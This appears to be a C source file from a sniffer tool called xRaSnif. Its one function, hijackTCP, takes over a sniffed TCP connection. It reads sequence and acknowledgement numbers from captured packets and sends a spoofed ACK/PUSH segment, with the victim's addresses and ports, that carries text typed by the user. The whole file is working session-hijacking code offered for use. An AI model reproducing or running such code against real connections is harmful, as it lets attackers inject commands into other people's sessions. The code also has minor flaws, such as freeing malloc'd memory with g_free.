/* xRaSnif by RaPass <rapass@gmx.net> */
#include "xRaSnif.h"

gboolean hijackTCP(GtkWidget *Bouton, GtkWidget **widgets) {

  struct iphdr *ip, *ip2;
  struct tcphdr *tcp, *tcp2;
  int i;
  long seq;
  char *hijackstring;


  ip =(struct iphdr *)(connections[ligne_select] + SIZE_WID + ENTETE_ETH);
  tcp =(struct tcphdr *)(connections[ligne_select] + SIZE_WID + 
			 ENTETE_ETH + ENTETE_IP);

  fprintf(stderr, "\033[1;32mAppelle du HiJaCkeR dE ConNecTIonS sur la %d\n\033[0m", 
	  ligne_select);

  pthread_mutex_lock(&my_mutex);
  if ((i = cherche_connection(ip, tcp, NbrLignes, 1)) < 0) {
    fprintf(stderr, "\033[1;31mImpossible de hijacker cette connection :(\n\033[0m");
    pthread_mutex_unlock(&my_mutex);
    return TRUE;
  }
  
  ip2 =(struct iphdr *)(connections[i] + SIZE_WID + ENTETE_ETH);
  tcp2 =(struct tcphdr *)(connections[i] + SIZE_WID +
			    ENTETE_ETH + ENTETE_IP);
    
  
  if (strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) > 0) {
    
    seq = ntohl(tcp2->seq) + ntohs(ip2->tot_len) - ENTETE_IP - (tcp2->doff*4);

    hijackstring = malloc(strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) + 3);
    strcpy(hijackstring, gtk_entry_get_text(GTK_ENTRY(widgets[0])));

    hijackstring[strlen(hijackstring)] = 10;
    if (gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(widgets[1])))
      hijackstring[strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) + 1] = 13;
    else
      hijackstring[strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) + 1] = '\0';
    
    hijackstring[strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0]))) + 2] = '\0';
       
    envoie_tcp(ip->saddr, ip->daddr,
	       ntohs(tcp->source), ntohs(tcp->dest), TH_ACK | TH_PUSH,
	       ntohl(tcp2->ack_seq), seq, 32120, 
	       hijackstring, strlen(gtk_entry_get_text(GTK_ENTRY(widgets[0])))+2);
    
    g_free(hijackstring);
  }
  pthread_mutex_unlock(&my_mutex);
  return TRUE;
}
